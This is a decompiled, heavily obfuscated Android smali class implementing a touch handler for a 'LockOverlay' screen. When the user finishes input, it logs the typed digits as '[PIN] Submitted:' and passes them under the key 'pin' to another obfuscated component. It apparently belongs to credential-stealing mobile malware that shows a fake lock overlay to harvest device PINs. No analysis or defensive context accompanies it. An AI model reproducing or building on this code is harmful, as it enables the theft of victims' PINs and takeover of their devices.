.class public final Lڝږ؁ڋ/ط;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Landroid/view/View$OnTouchListener;


# instance fields
.field public final synthetic ؋:Landroid/widget/FrameLayout;

.field public final synthetic ؠ:Z

.field public final synthetic ء:Ljava/lang/StringBuilder;

.field public final synthetic آ:Lڝږ؁ڋ/ظ;


# direct methods
.method public constructor <init>(Lڝږ؁ڋ/ظ;Landroid/widget/FrameLayout;ZLjava/lang/StringBuilder;Landroid/widget/TextView;Ljava/util/ArrayList;Landroid/widget/LinearLayout;)V
    .locals 0

    iput-object p1, p0, Lڝږ؁ڋ/ط;->آ:Lڝږ؁ڋ/ظ;

    iput-object p2, p0, Lڝږ؁ڋ/ط;->؋:Landroid/widget/FrameLayout;

    iput-boolean p3, p0, Lڝږ؁ڋ/ط;->ؠ:Z

    iput-object p4, p0, Lڝږ؁ڋ/ط;->ء:Ljava/lang/StringBuilder;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final onTouch(Landroid/view/View;Landroid/view/MotionEvent;)Z
    .locals 4

    invoke-virtual {p2}, Landroid/view/MotionEvent;->getAction()I

    move-result p1

    const/4 p2, 0x1

    if-ne p1, p2, :cond_2

    iget-object p1, p0, Lڝږ؁ڋ/ط;->؋:Landroid/widget/FrameLayout;

    invoke-static {p1}, Lڝږ؁ڋ/ظ;->؋(Landroid/widget/FrameLayout;)V

    iget-boolean v0, p0, Lڝږ؁ڋ/ط;->ؠ:Z

    invoke-static {v0, p1}, Lڝږ؁ڋ/ظ;->ؠ(ZLandroid/widget/FrameLayout;)V

    iget-object p1, p0, Lڝږ؁ڋ/ط;->آ:Lڝږ؁ڋ/ظ;

    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    iget-object v0, p0, Lڝږ؁ڋ/ط;->ء:Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->length()I

    move-result v1

    if-gtz v1, :cond_0

    goto :goto_0

    :cond_0
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "[PIN] Submitted: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "LockOverlay"

    invoke-static {v2, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v1, p1, Lڝږ؁ڋ/ظ;->أ:Lژة۪ڦضۆۿۡ/ح;

    if-eqz v1, :cond_1

    const-string v1, "pin"

    invoke-static {v1, v0}, Lژة۪ڦضۆۿۡ/ح;->؋(Ljava/lang/String;Ljava/lang/String;)V

    :cond_1
    iget-object v0, p1, Lڝږ؁ڋ/ظ;->ؤ:Landroid/os/Handler;

    new-instance v1, Landroidx/constraintlayout/helper/widget/؋;

    const/16 v2, 0x16

    invoke-direct {v1, v2, p1}, Landroidx/constraintlayout/helper/widget/؋;-><init>(ILjava/lang/Object;)V

    const-wide/16 v2, 0x1f4

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_2
    :goto_0
    return p2
.end method
